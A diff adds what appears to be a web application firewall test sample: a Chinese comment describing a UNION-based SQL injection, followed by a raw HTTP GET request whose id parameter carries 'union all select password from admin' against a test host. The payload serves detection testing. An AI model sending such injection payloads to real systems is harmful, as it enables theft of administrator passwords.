@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_普通注入-06506224
+# 攻击者基于UNION查询，将"union all select password from admin"语句注入到 SQL 查询参数中，使用all关键字将原始查询的结果集与来自"admin"表的密码字段的结果集合并。如果注入攻击成功，查询的结果将包含"admin"表的密码字段的值，这可能会导致管理员密码被泄露，从而对系统的安全造成严重威胁。
+GET /?id=1%20union%20all%20select%20password%20from%20admin&bid=hd_tag_m8mv24fj HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24fj
+RM-PRO-Token: ee1699c995ec69907851e7bcadab627e
+RM-PRO-Time: 1742808379502
+User-Agent: curl/7.83.1
+
